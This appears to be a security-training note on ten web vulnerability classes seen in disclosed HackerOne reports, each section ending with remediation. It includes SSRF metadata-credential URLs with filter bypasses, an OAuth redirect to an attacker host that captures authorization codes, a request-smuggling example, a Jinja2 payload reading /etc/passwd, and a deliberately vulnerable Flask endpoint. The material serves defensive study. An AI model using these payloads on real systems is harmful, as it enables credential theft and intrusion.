---
tags: [bug-bounty, chaining, real-world, vapt]
difficulty: advanced
module: "60 - Advanced Chaining and Real-World Scenarios"
topic: "60.06 HackerOne Disclosed Reports"
---

# 60.06 HackerOne Disclosed Reports: Top 10 Deep Dive

## 1. Introduction to Real-World Vulnerability Research

When transitioning from controlled laboratory environments and vulnerable-by-design applications (like DVWA or Juice Shop) to real-world targets, security researchers often encounter a vast gulf in complexity. Modern applications deployed by major technology companies utilize advanced request routing, Web Application Firewalls (WAFs), microservices architectures, caching layers, and incredibly complex state management logic. 

Reviewing publicly disclosed reports on platforms like HackerOne is one of the most effective ways to bridge this gap. These reports provide an unvarnished, raw look into how theoretical vulnerabilities manifest in production systems, how enterprise security filters are bypassed, and how seemingly low-severity bugs are strategically chained into critical, unauthenticated remote code execution or massive data breaches. 

This document explores the top ten most impactful categories of disclosed vulnerabilities on HackerOne, offering an extreme-depth technical analysis of each, highlighting the "hacker mindset," and detailing complex exploit chains.

## 2. Server-Side Request Forgery (SSRF) in Cloud Environments

SSRF is arguably the most devastating vulnerability in modern cloud-native applications. It occurs when an application fetches a remote resource based on user-controllable input without sufficient validation. In the context of cloud infrastructure (AWS, GCP, Azure), this translates to a complete compromise of the underlying cloud environment.

### Architecture and Attack Flow Diagram

```text
+----------------+                               +-------------------------+
|                |                               |                         |
|  Attacker      | ======(1) Malicious Payload==>|  Public Load Balancer   |
|                |       {"url":"169.254..."}    |  (WAF / Frontend)       |
+----------------+                               +-----------+-------------+
                                                             |
                                                             | (2) Route Request
                                                             v
+-------------------------+                      +-------------------------+
|                         |                      |                         |
|  AWS IMDSv1             | <======(3) GET=======|  Backend App Server     |
|  (169.254.169.254)      |        Metadata      |  (Vulnerable Parser)    |
+-------------------------+                      +-----------+-------------+
             |                                               |
             | (4) Return IAM Credentials                    | (5) Return Data
             +-----------------------------------------------+
```

### The "Why" and "How" of SSRF
The underlying cause of SSRF is trusting user input in functions that make HTTP requests (e.g., `requests.get()` in Python, `curl_exec()` in PHP, `axios.get()` in Node.js). 

In a cloud environment like AWS, EC2 instances have access to a local metadata service at `169.254.169.254`. This service does not require standard authentication because it relies on the network boundary (only requests originating from the instance itself can reach it). If an attacker forces the backend to request `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, the service responds with temporary AWS access keys associated with that instance's IAM role.

### Advanced Bypass Techniques
Developers often attempt to mitigate SSRF using blacklists. Attackers utilize several techniques to bypass these naive filters:
1.  **IP Encoding:** The IP `169.254.169.254` can be represented in various formats that evade regular expression filters:
    *   Decimal: `http://2852039166`
    *   Hexadecimal: `http://0xa9fea9fe`
    *   Octal: `http://0251.0376.0251.0376`
2.  **DNS Rebinding:** The attacker sets up a custom domain (`attacker.com`) with an extremely short Time-To-Live (TTL). During the application's validation phase, the DNS resolves to a safe IP (e.g., `8.8.8.8`). The application approves the URL and proceeds to fetch it. However, right before the actual HTTP fetch, the DNS record is updated (or the TTL expires and a new resolution is forced) to point to `127.0.0.1` or `169.254.169.254`.
3.  **Open Redirects:** If the application resolves domains but follows redirects blindly, an attacker can provide `http://trusted-domain.com/redirect?url=http://169.254.169.254`. The initial validation checks `trusted-domain.com` and passes, but the HTTP client follows the redirect directly to the internal asset.

### Vulnerable Code Example (Python/Flask)
```python
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/fetch_image')
def fetch_image():
    image_url = request.args.get('url')
    # Flaw: No validation on the URL scheme or destination IP
    response = requests.get(image_url) 
    return response.content
```

### Remediation Strategy
The most robust mitigation is to use an allowlist of approved domains. If fetching arbitrary URLs is a business requirement, implement a dedicated network proxy that drops requests to private IP ranges (RFC 1918) and the `169.254.0.0/16` range. In AWS, upgrading to IMDSv2 adds a layer of protection by requiring a specific `X-aws-ec2-metadata-token` header, which is difficult to inject via standard SSRF.

---

## 3. Broken Object Level Authorization (BOLA) / IDOR

BOLA, formerly known as Insecure Direct Object References (IDOR), is the root cause of many massive data breaches and consistently ranks as a high-paying bug on HackerOne. It occurs when an API endpoint takes an object ID from the client and fails to verify if the authenticated user has permission to access that specific object.

### The Mechanics of BOLA
APIs often use RESTful patterns like `GET /api/v1/users/{user_id}/financial_data`. When a user logs in, they receive an authentication token (e.g., a JWT). When they request their data, they send the token and their specific ID.
The vulnerability arises when the backend validates the JWT (confirming the user is logged in) but *fails* to verify that the `{user_id}` in the URL matches the identity established by the JWT. 

### Exploitation Context and Nuances
Attackers automate the exploitation of BOLA using tools like Burp Suite Intruder. They iterate through thousands of sequential IDs, extracting Personally Identifiable Information (PII). 
In real-world scenarios, BOLA is rarely found on primary, obvious endpoints. Attackers hunt for BOLA in:
- **Legacy API Versions:** Targeting `/api/v1/` endpoints where authorization checks might be missing compared to the hardened `/api/v2/`.
- **Mobile Endpoints:** Applications often have separate endpoints for mobile apps (e.g., `/api/mobile/v3/profile`) that are less rigorously tested than web endpoints.
- **Parameter Pollution:** Submitting multiple IDs to bypass poorly written checks: `GET /api/v2/invoices?id=10045&id=10046`. The WAF might check the first ID, but the backend processes the second.

### Remediation Strategy
Implement robust, centralized authorization checks at the data access layer. Never rely on the client-provided ID to determine ownership. Instead, extract the user's identity from the secure session context (e.g., the validated JWT) and structure database queries to inherently include an ownership check: `SELECT * FROM invoices WHERE id = ? AND user_id = ?`.

---

## 4. Account Takeover (ATO) via OAuth Misconfigurations

OAuth 2.0 is an authorization framework that allows third-party applications to access user data without exposing passwords. Its complexity and flexibility often lead to fatal implementation errors, resulting in complete Account Takeovers (ATO).

### The `redirect_uri` Flaw
The OAuth flow relies heavily on the `redirect_uri` parameter. After a user authenticates with the OAuth provider (e.g., Google or Facebook), the provider redirects the user back to the client application, appending a highly sensitive authorization code to the URL (`?code=xyz123`).

If the client application fails to strictly validate the `redirect_uri` against a pre-registered whitelist, an attacker can manipulate it.
1.  **Crafting the Payload:** The attacker initiates the flow: `https://provider.com/oauth/authorize?client_id=APP_ID&redirect_uri=https://attacker.com/steal_code`.
2.  **Delivery:** The attacker sends this link to the victim.
3.  **Authentication:** The victim clicks the link and authenticates with the provider.
4.  **The Hijack:** The provider redirects the victim to `https://attacker.com/steal_code?code=AUTH_CODE`.
5.  **Execution:** The attacker's server captures the authorization code, exchanges it for an access token via the provider's backend, and takes full control of the victim's account.

### The Missing `state` Parameter (CSRF in OAuth)
The `state` parameter is designed to prevent Cross-Site Request Forgery (CSRF) in the OAuth flow. It acts as a cryptographic nonce tied to the user's session. If an application omits this parameter or fails to validate it:
1. The attacker logs into their own account and initiates the OAuth linking flow.
2. They intercept the redirect containing *their* authorization code and drop the request.
3. They trick the victim into clicking that exact redirect URL.
4. The victim's browser sends the request to the application, linking the attacker's social media account to the victim's application account.
5. The attacker logs in using "Sign in with Google" and accesses the victim's sensitive data.

### Remediation Strategy
Always strictly validate the `redirect_uri` against an exact, pre-registered string. Do not use wildcards or regex for validation. Always implement and strongly validate the `state` parameter, ensuring it is a high-entropy, unpredictable string tied securely to the user's initial session.

---

## 5. RCE via Insecure Deserialization

Deserialization vulnerabilities occur when an application takes serialized data (e.g., JSON, XML, Java objects, PHP serialized strings) provided by a user and instantiates it into native objects without sufficient validation or sanitization. 

### Deep Dive: Java Deserialization
In Java, utilizing classes like `ObjectInputStream.readObject()` to parse user data is notoriously dangerous. When processing a serialized stream, Java will instantiate the object and call specific "magic methods" (like `readObject()`, `finalize()`, or `hashCode()`) as part of the internal reconstruction process. 

Attackers use automated tools like `ysoserial` to craft complex chains of objects known as "Gadget Chains." These chains leverage classes that are already present in the application's classpath (e.g., libraries like Apache Commons Collections, Spring, or Hibernate) to string together method calls that ultimately execute arbitrary system commands via `Runtime.getRuntime().exec()`.

### Exploitation Context
The payload is often delivered in HTTP headers, cookies, or POST bodies, typically encoded in Base64. A telltale sign of a Java serialized object is the presence of the magic bytes `ac ed 00 05` (often visible as `rO0AB` when Base64 encoded).

### Remediation Strategy
The only definitive fix for insecure deserialization is to completely avoid deserializing untrusted data. Transition to utilizing safe, strictly typed data formats like JSON or Protocol Buffers. If native deserialization is absolutely mandatory, implement strict allow-listing of classes that are permitted to be deserialized using `ObjectInputFilter`.

---

## 6. HTTP Request Smuggling

HTTP Request Smuggling exploits critical discrepancies in how frontend proxies (like HAProxy, Nginx, or AWS ALB) and backend servers (like Gunicorn, Node.js, or Tomcat) process the boundaries of HTTP requests, specifically the `Content-Length` (CL) and `Transfer-Encoding` (TE) headers. 

### The TE.CL Attack Scenario
In a TE.CL attack, the frontend proxy processes the `Transfer-Encoding: chunked` header, while the backend server processes the `Content-Length` header. 
An attacker sends a specially crafted request containing both headers. 

```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 44

0

POST /admin/delete_user HTTP/1.1
Host: vulnerable.com
```

The frontend proxy reads the chunked data (which terminates at the `0`), forwarding the entire payload. However, the backend server relies on the `Content-Length` header. It processes the first part of the request and leaves the remainder (the "smuggled" request to `/admin/delete_user`) sitting in the TCP buffer. When the next legitimate user sends a request over the same reused TCP connection, the backend prepends the smuggled data to the user's request, executing the administrative action using the victim's session cookies.

### Remediation Strategy
Mitigate request smuggling by ensuring that the frontend and backend servers handle HTTP headers uniformly. Disable connection reuse (Keep-Alive) if necessary, or configure the frontend to strictly reject ambiguous requests containing both `Content-Length` and `Transfer-Encoding` headers. Utilizing HTTP/2 end-to-end also significantly reduces the risk of smuggling due to its distinct, binary framing mechanism.

---

## 7. Business Logic Flaws and Race Conditions

Unlike SQL Injection or XSS, business logic flaws cannot be detected by automated scanners because they represent a failure in the application's intended workflow or financial models, rather than a syntactical coding error. 

### Race Conditions (TOCTOU)
A classic example frequently seen in bug bounties is a "Time-of-Check to Time-of-Use" (TOCTOU) race condition in e-commerce or financial applications. 
Consider a user attempting to redeem a single-use gift card worth $100. 
1.  **Check Phase:** The system verifies the gift card is valid and unused.
2.  **Use Phase:** The system adds $100 to the user's balance and marks the card as "used" in the database.

If an attacker uses a tool like Burp Suite's Turbo Intruder to send 100 simultaneous requests to redeem the exact same card, multiple application threads might perform the "Check Phase" simultaneously before *any* thread reaches the database update in the "Use Phase". All 100 threads see the card as valid and approve the transaction, resulting in $10,000 being credited to the attacker from a single $100 card.

### Remediation Strategy
Implement strict database concurrency controls. Use pessimistic locking (`SELECT ... FOR UPDATE`) when querying the status of critical assets like gift cards or account balances, ensuring that only one thread can access and modify the record at a time. Alternatively, utilize atomic database operations.

---

## 8. Server-Side Template Injection (SSTI)

SSTI occurs when user input is unsafely concatenated directly into a server-side template before evaluation, rather than being passed safely as a variable binding to the template engine. This allows the execution of arbitrary template directives.

### From Identification to RCE
Attackers begin by injecting polyglot payloads (e.g., `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`) to identify the underlying template engine (Jinja2, Twig, FreeMarker). If the application uses Jinja2 (Python) and renders `template.render("Hello " + user_input)`, an attacker supplying `{{7*7}}` will see `Hello 49` in the response.

To escalate this to Remote Code Execution, attackers must escape the template engine's sandbox. In Python's Jinja2, this involves traversing the Method Resolution Order (MRO) to locate loaded classes that allow system command execution, such as `subprocess.Popen`.

```python
# Jinja2 RCE Payload Example
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
```

### Remediation Strategy
Never construct template strings dynamically by concatenating user input. Always use the built-in context variables and data binding mechanisms provided by the template engine framework. If dynamic templates are required, execute them within an isolated, heavily restricted sandbox environment.

---

## 9. GraphQL Misconfigurations

As organizations shift from REST to GraphQL, a new class of vulnerabilities has emerged. GraphQL's inherent flexibility often leads to exposing massive, unintentional attack surfaces.

### Introspection and Schema Leaks
GraphQL features a built-in mechanism called Introspection, which allows clients to query the API for its own schema. If introspection is left enabled in production, an attacker can simply send a `__schema` query to map out every single query, mutation, and data type available. This immediately uncovers undocumented endpoints, administrative functions, and hidden internal data structures, massively accelerating further attacks.

### Deeply Nested Queries and DoS
GraphQL allows the client to dictate the exact shape and depth of the data returned. An attacker can craft a maliciously recursive query that requests deeply nested relationships. For example, fetching a User, their Friends, the Friends of those Friends, and so on. This triggers an exponential explosion of backend database queries, exhausting server memory and CPU, leading to a catastrophic Denial of Service (DoS).

### Remediation Strategy
Disable Introspection in production environments entirely. To prevent DoS attacks, implement strict limitations on Query Depth and Query Complexity. Additionally, enforce rate limiting based on the calculated complexity of the incoming GraphQL query rather than just the raw HTTP request count.

---

## 10. Web Cache Poisoning

Modern web applications heavily rely on caching layers (CDNs like Cloudflare, Fastly, or reverse proxies like Varnish) to improve performance and reduce backend load. Web Cache Poisoning occurs when an attacker manipulates the application into generating a malicious HTTP response that gets cached and subsequently served to all legitimate users.

### Exploitation Strategy
Attackers focus on "unkeyed" HTTP headers. These are headers that the backend application processes, but the caching layer *ignores* when generating a unique cache key for a resource (examples include `X-Forwarded-Host` or `X-Original-URL`). 

If the backend application carelessly reflects the value of `X-Forwarded-Host` into a dynamically generated JavaScript URL or a `<link>` tag, the attacker can inject their own malicious domain. The backend returns a response pointing to the attacker's script. The CDN, seeing a request for a standard resource, caches this malicious response. Any subsequent user requesting the legitimate page will receive the poisoned cached response, resulting in massive, unauthenticated Stored XSS impacting thousands of users.

### Remediation Strategy
Understand exactly which headers are used in your caching layer's cache keys. Avoid utilizing unkeyed input to dynamically generate critical elements like URLs or script sources. Implement strong Content Security Policies (CSP) to mitigate the impact even if cache poisoning occurs.

---

## Chaining Opportunities
Understanding these top ten vulnerabilities individually is critical, but mastering Bug Bounty requires chaining them together. Real-world exploits are rarely a single flaw.
-   **XSS + CSRF -> Account Takeover:** A low-severity Reflected XSS vulnerability can be chained with a CSRF flaw. The attacker uses the XSS to execute JavaScript silently in the victim's browser. This JavaScript fetches a CSRF token and submits a hidden form to change the victim's email address or password, resulting in a full Account Takeover without the user ever realizing it.
-   **BOLA + Mass Assignment:** An attacker uses a BOLA vulnerability to view another user's profile data. They chain this with Mass Assignment by injecting the `{"is_admin": true}` or `{"role": "superuser"}` parameter during a PUT request to update the profile, elevating their privileges to complete system compromise.
-   **Information Disclosure + Deserialization:** An attacker discovers a simple directory traversal or open S3 bucket that leaks the application's source code. They analyze the source code to identify internal library versions and construct a custom, perfectly tailored deserialization gadget chain to achieve RCE.

## Related Notes
- [[01 - API1 — Broken Object Level Authorization (BOLA)]]
- [[02 - Cross-Site Scripting (XSS) Deep Dive]]
- [[03 - Server-Side Request Forgery (SSRF) Mastery]]
- [[04 - Advanced Deserialization Attacks]]
- [[05 - OAuth 2.0 Security and Exploitation]]
- [[11 - Introduction to CI/CD Security]]
